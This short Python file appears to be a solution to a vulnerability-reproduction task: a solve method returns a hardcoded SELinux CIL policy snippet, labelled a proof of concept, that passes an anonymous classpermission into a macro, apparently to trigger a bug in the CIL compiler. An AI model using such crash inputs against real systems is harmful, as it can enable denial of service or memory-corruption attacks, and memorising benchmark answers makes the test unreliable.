import sys


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""(block bug
    (class c (p))
    (macro m ((cp classpermission))
        (classpermissionset myset (cp))
    )
    (call m
        ((cp
            (classpermission
                ((c (p)))
            )
        ))
    )
)
"""
        return poc
